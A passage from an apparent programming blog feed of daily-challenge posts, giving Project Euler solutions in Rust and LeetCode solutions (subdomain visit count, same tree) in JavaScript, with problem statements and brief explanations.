class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">20849603980134001723930671666823555245252804609722</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">53503534226472524250874054075591789781264330331690</span><span class="string">"];</span></span><br><span class="line"><span class="string">    let mut sum = BigInt::parse_bytes(b"</span><span class="number">0</span><span class="string">", 10).unwrap();</span></span><br><span class="line"><span class="string">    for i in nums.iter() &#123;</span></span><br><span class="line"><span class="string">        let tmp = BigInt::parse_bytes(*i, 10).unwrap(); </span></span><br><span class="line"><span class="string">        sum = sum + &amp;tmp;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    println!("</span>Answer is &#123;&#125;<span class="string">",sum.to_str_radix(10));</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">811. Subdomain Visit Count</span><br><span class="line"></span><br><span class="line">A website domain like &quot;discuss.leetcode.com&quot; consists of various subdomains. At the top level, we have &quot;com&quot;, at the next level, we have &quot;leetcode.com&quot;, and at the lowest level, &quot;discuss.leetcode.com&quot;. When we visit a domain like &quot;discuss.leetcode.com&quot;, we will also visit the parent domains &quot;leetcode.com&quot; and &quot;com&quot; implicitly.</span><br><span class="line"></span><br><span class="line">Now, call a &quot;count-paired domain&quot; to be a count (representing the number of visits this domain received), followed by a space, followed by the address. An example of a count-paired domain might be &quot;9001 discuss.leetcode.com&quot;.</span><br><span class="line"></span><br><span class="line">We are given a list cpdomains of count-paired domains. We would like a list of count-paired domains, (in the same format as the input, and in any order), that explicitly counts the number of visits to each subdomain.</span><br><span class="line"></span><br><span class="line">Example 1:</span><br><span class="line">Input: </span><br><span class="line">[&quot;9001 discuss.leetcode.com&quot;]</span><br><span class="line">Output: </span><br><span class="line">[&quot;9001 discuss.leetcode.com&quot;, &quot;9001 leetcode.com&quot;, &quot;9001 com&quot;]</span><br><span class="line">Explanation: </span><br><span class="line">We only have one website domain: &quot;discuss.leetcode.com&quot;. As discussed above, the subdomain &quot;leetcode.com&quot; and &quot;com&quot; will also be visited. So they will all be visited 9001 times.</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">Input: </span><br><span class="line">[&quot;900 google.mail.com&quot;, &quot;50 yahoo.com&quot;, &quot;1 intel.mail.com&quot;, &quot;5 wiki.org&quot;]</span><br><span class="line">Output: </span><br><span class="line">[&quot;901 mail.com&quot;,&quot;50 yahoo.com&quot;,&quot;900 google.mail.com&quot;,&quot;5 wiki.org&quot;,&quot;5 org&quot;,&quot;1 intel.mail.com&quot;,&quot;951 com&quot;]</span><br><span class="line">Explanation: </span><br><span class="line">We will visit &quot;google.mail.com&quot; 900 times, &quot;yahoo.com&quot; 50 times, &quot;intel.mail.com&quot; once and &quot;wiki.org&quot; 5 times. For the subdomains, we will visit &quot;mail.com&quot; 900 + 1 = 901 times, &quot;com&quot; 900 + 50 + 1 = 951 times, and &quot;org&quot; 5 times.</span><br><span class="line"></span><br><span class="line">Notes:</span><br><span class="line"></span><br><span class="line">The length of cpdomains will not exceed 100. </span><br><span class="line">The length of each domain name will not exceed 100.</span><br><span class="line">Each address will have either 1 or 2 &quot;.&quot; characters.</span><br><span class="line">The input count in any count-paired domain will not exceed 10000.</span><br><span class="line">The answer output can be returned in any order.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>just need a map.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string[]&#125; cpdomains</span></span><br><span class="line"><span class="comment"> * @return &#123;string[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> subdomainVisits = <span class="function"><span class="keyword">function</span>(<span class="params">cpdomains</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">let</span> ans = [];</span><br><span class="line">  <span class="keyword">let</span> add = <span class="function">(<span class="params">key, val</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (map.has(key)) map.set(key, map.get(key) + val);</span><br><span class="line">    <span class="keyword">else</span> map.set(key, val);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> cpdomain <span class="keyword">of</span> cpdomains)&#123;</span><br><span class="line">    <span class="keyword">let</span> tmp = cpdomain.split(<span class="string">" "</span>);</span><br><span class="line">    <span class="keyword">let</span> cnt = +tmp[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">let</span> domain = tmp[<span class="number">1</span>];</span><br><span class="line">    add(domain, cnt);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = domain.length - <span class="number">1</span>; i&gt;= <span class="number">0</span> ; --i)&#123;</span><br><span class="line">      <span class="keyword">if</span>(domain.charAt(i) === <span class="string">"."</span>) &#123;</span><br><span class="line">        add(domain.slice(i+<span class="number">1</span>), cnt);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">const</span> [key, value] <span class="keyword">of</span> map)&#123;</span><br><span class="line">    ans.push(value + <span class="string">" "</span> + key);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(subdomainVisits(["900 google.mail.com", "50 yahoo.com", "1 intel.mail.com", "5 wiki.org"]));</span></span><br><span class="line"><span class="comment">// console.log(subdomainVisits(["9001 discuss.leetcode.com"]));</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-01 Daily Challenge</title>
      <link href="/2019-01-01-Daily-Challenge/"/>
      <url>/2019-01-01-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p><strong>HAPPY NEW YEAR!</strong></p><p>What I&#39;ve done today is <em>Highly divisible triangular number</em> in <em>Rust</em> and <em>Same Tree</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Highly divisible triangular number</span><br><span class="line"></span><br><span class="line">Problem 12 </span><br><span class="line"></span><br><span class="line">The sequence of triangle numbers is generated by adding the natural numbers. So the 7th triangle number would be 1 + 2 + 3 + 4 + 5 + 6 + 7 = 28. The first ten terms would be:</span><br><span class="line"></span><br><span class="line">1, 3, 6, 10, 15, 21, 28, 36, 45, 55, ...</span><br><span class="line"></span><br><span class="line">Let us list the factors of the first seven triangle numbers:</span><br><span class="line"></span><br><span class="line"> 1: 1</span><br><span class="line"> 3: 1,3</span><br><span class="line"> 6: 1,2,3,6</span><br><span class="line">10: 1,2,5,10</span><br><span class="line">15: 1,3,5,15</span><br><span class="line">21: 1,3,7,21</span><br><span class="line">28: 1,2,4,7,14,28</span><br><span class="line">We can see that 28 is the first triangle number to have over five divisors.</span><br><span class="line"></span><br><span class="line">What is the value of the first triangle number to have over five hundred divisors?</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>It&#39;s easy to understand that if prime factorization of $n$ is given by</p><p>$$n=p_1^{v_1}p_2^{v_2}...p_k^{v_k}$$</p><p>Then the number of positive divisors of $n$ is </p><p>$$d(n)=(v_1+1)(v_2+1)...(v_k+1)$$.</p><p>If you do not get it, check <a href="https://www.math.upenn.edu/~deturck/m170/wk2/numdivisors.html" target="_blank" rel="noopener">https://www.math.upenn.edu/~deturck/m170/wk2/numdivisors.html</a></p><p>So just factorize triangle numbers and check if it&#39;s answer.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> primal;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> sieve = primal::Sieve::new(<span class="number">14751430</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0i64</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1i64</span>..<span class="number">10000000i64</span> &#123;</span><br><span class="line">        ans += i;</span><br><span class="line">        <span class="keyword">let</span> factors: <span class="built_in">Vec</span>&lt;(<span class="built_in">usize</span>, <span class="built_in">usize</span>)&gt; = <span class="keyword">match</span> sieve.factor(ans <span class="keyword">as</span> <span class="built_in">usize</span>) &#123;</span><br><span class="line">            <span class="literal">Ok</span>(v) =&gt; v,</span><br><span class="line">            <span class="literal">Err</span>(_) =&gt; <span class="built_in">Vec</span>::new(),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> count = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> factor <span class="keyword">in</span> factors &#123;</span><br><span class="line">            count *= factor.<span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> count &gt; <span class="number">500</span> &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">100. Same Tree</span><br><span class="line"></span><br><span class="line">Given two binary trees, write a function to check if they are the same or not.</span><br><span class="line"></span><br><span class="line">Two binary trees are considered the same if they are structurally identical and the nodes have the same value.</span><br><span class="line"></span><br><span class="line">Example 1:</span><br><span class="line"></span><br><span class="line">Input:     1         1</span><br><span class="line">          / \       / \</span><br><span class="line">         2   3     2   3</span><br><span class="line"></span><br><span class="line">        [1,2,3],   [1,2,3]</span><br><span class="line"></span><br><span class="line">Output: true</span><br><span class="line">Example 2:</span><br><span class="line"></span><br><span class="line">Input:     1         1</span><br><span class="line">          /           \</span><br><span class="line">         2             2</span><br><span class="line"></span><br><span class="line">        [1,2],     [1,null,2]</span><br><span class="line"></span><br><span class="line">Output: false</span><br><span class="line">Example 3:</span><br><span class="line"></span><br><span class="line">Input:     1         1</span><br><span class="line">          / \       / \</span><br><span class="line">         2   1     1   2</span><br><span class="line"></span><br><span class="line">        [1,2,1],   [1,1,2]</span><br><span class="line"></span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>I just to lazy to implement it with non-recursive approach. ;P</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * function TreeNode(val) &#123;</span></span><br><span class="line"><span class="comment"> *     this.val = val;</span></span><br><span class="line"><span class="comment"> *     this.left = this.right = null;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;TreeNode&#125; p</span></span><br><span class="line"><span class="comment"> * @param &#123;TreeNode&#125; q</span></span><br><span class="line"><span class="comment"> * @return &#123;boolean&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> isSameTree = <span class="function">(<span class="params">p, q</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(!q||!p) <span class="keyword">return</span> q===p;</span><br><span class="line">  <span class="keyword">return</span> isSameTree(p.left,q.left)&amp;&amp;</span><br><span class="line">    isSameTree(p.right,q.right)&amp;&amp;</span><br><span class="line">    q.val===p.val;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018-12-31 Daily Challenge</title>
      <link href="/2018-12-31-Daily-Challenge/"/>
      <url>/2018-12-31-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Largest product in a grid</em> in <em>Rust</em> and <em>Reveal Cards In Increasing Order</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Largest product in a grid</span><br><span class="line"></span><br><span class="line">Problem 11 </span><br><span class="line"></span><br><span class="line">In the 20×20 grid below, four numbers along a diagonal line have been marked in red.</span><br><span class="line"></span><br><span class="line">08 02 22 97 38 15 00 40 00 75 04 05 07 78 52 12 50 77 91 08</span><br><span class="line">49 49 99 40 17 81 18 57 60 87 17 40 98 43 69 48 04 56 62 00</span><br><span class="line">81 49 31 73 55 79 14 29 93 71 40 67 53 88 30 03 49 13 36 65</span><br><span class="line">52 70 95 23 04 60 11 42 69 24 68 56 01 32 56 71 37 02 36 91</span><br><span class="line">22 31 16 71 51 67 63 89 41 92 36 54 22 40 40 28 66 33 13 80</span><br><span class="line">24 47 32 60 99 03 45 02 44 75 33 53 78 36 84 20 35 17 12 50</span><br><span class="line">32 98 81 28 64 23 67 10 26 38 40 67 59 54 70 66 18 38 64 70</span><br><span class="line">67 26 20 68 02 62 12 20 95 63 94 39 63 08 40 91 66 49 94 21</span><br><span class="line">24 55 58 05 66 73 99 26 97 17 78 78 96 83 14 88 34 89 63 72</span><br><span class="line">21 36 23 09 75 00 76 44 20 45 35 14 00 61 33 97 34 31 33 95</span><br><span class="line">78 17 53 28 22 75 31 67 15 94 03 80 04 62 16 14 09 53 56 92</span><br><span class="line">16 39 05 42 96 35 31 47 55 58 88 24 00 17 54 24 36 29 85 57</span><br><span class="line">86 56 00 48 35 71 89 07 05 44 44 37 44 60 21 58 51 54 17 58</span><br><span class="line">19 80 81 68 05 94 47 69 28 73 92 13 86 52 17 77 04 89 55 40</span><br><span class="line">04 52 08 83 97 35 99 16 07 97 57 32 16 26 26 79 33 27 98 66</span><br><span class="line">88 36 68 87 57 62 20 72 03 46 33 67 46 55 12 32 63 93 53 69</span><br><span class="line">04 42 16 73 38 25 39 11 24 94 72 18 08 46 29 32 40 62 76 36</span><br><span class="line">20 69 36 41 72 30 23 88 34 62 99 69 82 67 59 85 74 04 36 16</span><br><span class="line">20 73 35 29 78 31 90 01 74 31 49 71 48 86 81 16 23 57 05 54</span><br><span class="line">01 70 54 71 83 51 54 69 16 92 33 48 61 43 52 01 89 19 67 48</span><br><span class="line"></span><br><span class="line">The product of these numbers is 26 × 63 × 78 × 14 = 1788696.</span><br><span class="line"></span><br><span class="line">What is the greatest product of four adjacent numbers in the same direction (up, down, left, right, or diagonally) in the 20×20 grid?</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Brute force again</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [[<span class="number">49</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">40</span>, <span class="number">17</span>, <span class="number">81</span>, <span class="number">18</span>, <span class="number">57</span>, <span class="number">60</span>, <span class="number">87</span>, <span class="number">17</span>, <span class="number">40</span>, <span class="number">98</span>, <span class="number">43</span>, <span class="number">69</span>, <span class="number">48</span>, <span class="number">04</span>, <span class="number">56</span>, <span class="number">62</span>, <span class="number">00</span>],</span><br><span class="line">[<span class="number">81</span>, <span class="number">49</span>, <span class="number">31</span>, <span class="number">73</span>, <span class="number">55</span>, <span class="number">79</span>, <span class="number">14</span>, <span class="number">29</span>, <span class="number">93</span>, <span class="number">71</span>, <span class="number">40</span>, <span class="number">67</span>, <span class="number">53</span>, <span class="number">88</span>, <span class="number">30</span>, <span class="number">03</span>, <span class="number">49</span>, <span class="number">13</span>, <span class="number">36</span>, <span class="number">65</span>],</span><br><span class="line">[<span class="number">52</span>, <span class="number">70</span>, <span class="number">95</span>, <span class="number">23</span>, <span class="number">04</span>, <span class="number">60</span>, <span class="number">11</span>, <span class="number">42</span>, <span class="number">69</span>, <span class="number">24</span>, <span class="number">68</span>, <span class="number">56</span>, <span class="number">01</span>, <span class="number">32</span>, <span class="number">56</span>, <span class="number">71</span>, <span class="number">37</span>, <span class="number">02</span>, <span class="number">36</span>, <span class="number">91</span>],</span><br><span class="line">[<span class="number">22</span>, <span class="number">31</span>, <span class="number">16</span>, <span class="number">71</span>, <span class="number">51</span>, <span class="number">67</span>, <span class="number">63</span>, <span class="number">89</span>, <span class="number">41</span>, <span class="number">92</span>, <span class="number">36</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">28</span>, <span class="number">66</span>, <span class="number">33</span>, <span class="number">13</span>, <span class="number">80</span>],</span><br><span class="line">[<span class="number">24</span>, <span class="number">47</span>, <span class="number">32</span>, <span class="number">60</span>, <span class="number">99</span>, <span class="number">03</span>, <span class="number">45</span>, <span class="number">02</span>, <span class="number">44</span>, <span class="number">75</span>, <span class="number">33</span>, <span class="number">53</span>, <span class="number">78</span>, <span class="number">36</span>, <span class="number">84</span>, <span class="number">20</span>, <span class="number">35</span>, <span class="number">17</span>, <span class="number">12</span>, <span class="number">50</span>],</span><br><span class="line">[<span class="number">32</span>, <span class="number">98</span>, <span class="number">81</span>, <span class="number">28</span>, <span class="number">64</span>, <span class="number">23</span>, <span class="number">67</span>, <span class="number">10</span>, <span class="number">26</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">67</span>, <span class="number">59</span>, <span class="number">54</span>, <span class="number">70</span>, <span class="number">66</span>, <span class="number">18</span>, <span class="number">38</span>, <span class="number">64</span>, <span class="number">70</span>],</span><br><span class="line">[<span class="number">67</span>, <span class="number">26</span>, <span class="number">20</span>, <span class="number">68</span>, <span class="number">02</span>, <span class="number">62</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">95</span>, <span class="number">63</span>, <span class="number">94</span>, <span class="number">39</span>, <span class="number">63</span>, <span class="number">08</span>, <span class="number">40</span>, <span class="number">91</span>, <span class="number">66</span>, <span class="number">49</span>, <span class="number">94</span>, <span class="number">21</span>],</span><br><span class="line">[<span class="number">24</span>, <span class="number">55</span>, <span class="number">58</span>, <span class="number">05</span>, <span class="number">66</span>, <span class="number">73</span>, <span class="number">99</span>, <span class="number">26</span>, <span class="number">97</span>, <span class="number">17</span>, <span class="number">78</span>, <span class="number">78</span>, <span class="number">96</span>, <span class="number">83</span>, <span class="number">14</span>, <span class="number">88</span>, <span class="number">34</span>, <span class="number">89</span>, <span class="number">63</span>, <span class="number">72</span>],</span><br><span class="line">[<span class="number">21</span>, <span class="number">36</span>, <span class="number">23</span>, <span class="number">09</span>, <span class="number">75</span>, <span class="number">00</span>, <span class="number">76</span>, <span class="number">44</span>, <span class="number">20</span>, <span class="number">45</span>, <span class="number">35</span>, <span class="number">14</span>, <span class="number">00</span>, <span class="number">61</span>, <span class="number">33</span>, <span class="number">97</span>, <span class="number">34</span>, <span class="number">31</span>, <span class="number">33</span>, <span class="number">95</span>],</span><br><span class="line">[<span class="number">78</span>, <span class="number">17</span>, <span class="number">53</span>, <span class="number">28</span>, <span class="number">22</span>, <span class="number">75</span>, <span class="number">31</span>, <span class="number">67</span>, <span class="number">15</span>, <span class="number">94</span>, <span class="number">03</span>, <span class="number">80</span>, <span class="number">04</span>, <span class="number">62</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">09</span>, <span class="number">53</span>, <span class="number">56</span>, <span class="number">92</span>],</span><br><span class="line">[<span class="number">16</span>, <span class="number">39</span>, <span class="number">05</span>, <span class="number">42</span>, <span class="number">96</span>, <span class="number">35</span>, <span class="number">31</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">58</span>, <span class="number">88</span>, <span class="number">24</span>, <span class="number">00</span>, <span class="number">17</span>, <span class="number">54</span>, <span class="number">24</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">85</span>, <span class="number">57</span>],</span><br><span class="line">[<span class="number">86</span>, <span class="number">56</span>, <span class="number">00</span>, <span class="number">48</span>, <span class="number">35</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">07</span>, <span class="number">05</span>, <span class="number">44</span>, <span class="number">44</span>, <span class="number">37</span>, <span class="number">44</span>, <span class="number">60</span>, <span class="number">21</span>, <span class="number">58</span>, <span class="number">51</span>, <span class="number">54</span>, <span class="number">17</span>, <span class="number">58</span>],</span><br><span class="line">[<span class="number">19</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">68</span>, <span class="number">05</span>, <span class="number">94</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">28</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">13</span>, <span class="number">86</span>, <span class="number">52</span>, <span class="number">17</span>, <span class="number">77</span>, <span class="number">04</span>, <span class="number">89</span>, <span class="number">55</span>, <span class="number">40</span>],</span><br><span class="line">[<span class="number">04</span>, <span class="number">52</span>, <span class="number">08</span>, <span class="number">83</span>, <span class="number">97</span>, <span class="number">35</span>, <span class="number">99</span>, <span class="number">16</span>, <span class="number">07</span>, <span class="number">97</span>, <span class="number">57</span>, <span class="number">32</span>, <span class="number">16</span>, <span class="number">26</span>, <span class="number">26</span>, <span class="number">79</span>, <span class="number">33</span>, <span class="number">27</span>, <span class="number">98</span>, <span class="number">66</span>],</span><br><span class="line">[<span class="number">88</span>, <span class="number">36</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">57</span>, <span class="number">62</span>, <span class="number">20</span>, <span class="number">72</span>, <span class="number">03</span>, <span class="number">46</span>, <span class="number">33</span>, <span class="number">67</span>, <span class="number">46</span>, <span class="number">55</span>, <span class="number">12</span>, <span class="number">32</span>, <span class="number">63</span>, <span class="number">93</span>, <span class="number">53</span>, <span class="number">69</span>],</span><br><span class="line">[<span class="number">04</span>, <span class="number">42</span>, <span class="number">16</span>, <span class="number">73</span>, <span class="number">38</span>, <span class="number">25</span>, <span class="number">39</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">94</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">08</span>, <span class="number">46</span>, <span class="number">29</span>, <span class="number">32</span>, <span class="number">40</span>, <span class="number">62</span>, <span class="number">76</span>, <span class="number">36</span>],</span><br><span class="line">[<span class="number">20</span>, <span class="number">69</span>, <span class="number">36</span>, <span class="number">41</span>, <span class="number">72</span>, <span class="number">30</span>, <span class="number">23</span>, <span class="number">88</span>, <span class="number">34</span>, <span class="number">62</span>, <span class="number">99</span>, <span class="number">69</span>, <span class="number">82</span>, <span class="number">67</span>, <span class="number">59</span>, <span class="number">85</span>, <span class="number">74</span>, <span class="number">04</span>, <span class="number">36</span>, <span class="number">16</span>],</span><br><span class="line">[<span class="number">20</span>, <span class="number">73</span>, <span class="number">35</span>, <span class="number">29</span>, <span class="number">78</span>, <span class="number">31</span>, <span class="number">90</span>, <span class="number">01</span>, <span 